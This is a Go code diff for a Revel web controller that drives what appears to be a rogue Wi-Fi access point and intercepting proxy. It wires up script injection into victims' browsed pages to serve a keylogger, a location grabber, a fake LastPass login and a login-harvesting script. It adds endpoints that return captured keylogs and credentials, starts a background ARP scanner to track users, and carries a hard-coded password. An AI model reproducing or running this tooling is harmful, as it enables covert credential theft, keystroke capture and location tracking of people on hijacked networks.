@@ -3,16 +3,18 @@ package controllers
 import (
 	"github.com/revel/revel"
 	"log"
+	"fmt"
 	"io/ioutil"
 	"os/exec"
 	"path/filepath"
 	"time"
 	"strings"
 	"net"
+	"os"
 )
 
 const (
-    PASSWORD = "whitesilence"
+    PASSWORD = "demonstration"
     SECURE = false
 )
 
@@ -20,11 +22,40 @@ type App struct {
 	*revel.Controller
 }
 
+func (c App) GetField() revel.Result {
+	//this is to get the state of the proxy
+	var field int
+	c.Params.Bind(&field, "field")
+	log.Println("field: ", field)
+	switch field {
+		case 0:
+			//its the har state
+			log.Println("hars! ", globalStoreHAR)
+			return c.RenderJson(globalStoreHAR)
+		case 1: return c.RenderJson(globalRedirects)
+		case 2: return c.RenderJson(globalBlocks)
+		case 3: return c.RenderJson(globalWolfPack)
+		case 4: return c.RenderJson(globalInjectKeyLogger)
+		case 5: return c.RenderJson(globalInjectGetLocation)
+		case 6: return c.RenderJson(globalInjectLastpass)
+		default: return c.RenderJson("")
+	}
+}
 
 func InitiateProxy() {
 	//set the location for files
     log.Println("loading storage location")
-    setFileStorageLocation()
+    fileLocation, proxyAddress := setFileStorageLocation()
+    //setting the logger to output to a file
+	f, err := os.OpenFile(logLocation + "/logs.log", os.O_RDWR | os.O_CREATE | os.O_APPEND, 0666)
+	if err != nil {
+	    fmt.Println("error opening file")
+	}
+	defer f.Close()
+	
+	// log.SetOutput(f)
+
+    log.Println("location: ", fileLocation, " address: ", proxyAddress)
     //reset all parameters for the proxy
 	globalStoreHAR = false			
 	globalProxyStandard = false
@@ -47,13 +78,15 @@ func InitiateProxy() {
 	INJECT_LOCATION_RESULT =  "<script src=\"http://"+proxyAddress+":9000/public/InjectionScripts/getLocation.js\"></script></body>"
 	INJECT_LASTPASS_RESULT =  "<script src=\"http://"+proxyAddress+":9000/public/InjectionScripts/lastpassInjection.js\"></script></body>"
 	INJECT_LOGIN_RESULT =  "<script src=\"http://"+proxyAddress+":9000/public/InjectionScripts/login.js\"></script></body>"
+	users = make(map[string]string)
+	go arpScanner() //start the arpscanner in the background
 }
 
 func (c App) FetchAllData() revel.Result {
 
     //get the redirect pages from server
     log.Println("downloading files")
-    getPages()
+    // getPages()
     //get a list of urls to redirect
     log.Println("creating redirections...")
     getRedirectUrls()
@@ -62,7 +95,11 @@ func (c App) FetchAllData() revel.Result {
     getBannedUrls()
     log.Println("get news sites")
     getNewsUrls()
+    log.Println("completed getting files....")
     return c.RenderJson("finished fetching")
+}
+func (c App) ArpScan() revel.Result {
+	return c.RenderJson(users)
 }
 
 func (c App) Login() revel.Result {
@@ -98,6 +135,7 @@ func (c App) StartSimpleProxy() revel.Result {
 	}
 	// Return 
 	log.Println("Proxy shutting down")
+	log.Println("location: ", fileLocation, " address: ", proxyAddress)
 	return c.RenderJson("{Proxy:'restarted}")
 }
 
@@ -222,6 +260,7 @@ func (c App) ConnectToWifi() revel.Result {
 	var wifiPassword string
 	c.Params.Bind(&wifiName, "wifiName")
 	c.Params.Bind(&wifiPassword, "wifiPassword")
+	//if you are evil you attack this application right here
 	log.Println("/srv/wifi/setupwifi.sh", " ", wifiName, " ", wifiPassword)
 	cmd := exec.Command("/srv/wifi/setupwifi.sh", wifiName, wifiPassword)
 	output, err := cmd.CombinedOutput()
@@ -234,6 +273,7 @@ func (c App) CreateAccessPoint() revel.Result {
 	var connection string
 	c.Params.Bind(&connection, "connection")
 	c.Params.Bind(&apName, "name")
+	//if you are evil you attack this application right here
 	log.Println("/srv/wifi/setupEvilAP.sh", " ", connection, " ", apName)
 	cmd := exec.Command("/srv/wifi/setupEvilAP.sh", connection, apName)
 	output, err := cmd.CombinedOutput()
@@ -267,8 +307,8 @@ func (c App) GetKeylogs() revel.Result {
 	return c.RenderJson(keylogs)
 }
 /*
-          <input type="text" id="lppasswordbottom" class="lpinput" placeholder="Password">
-          <input type="text" id="lppasswordtop" class="lpinput" placeholder="Password">
+<input type="text" id="lppasswordbottom" class="lpinput" placeholder="Password">
+<input type="text" id="lppasswordtop" class="lpinput" placeholder="Password">
 */
 func (c App) Lastpass() revel.Result {
 	var username string
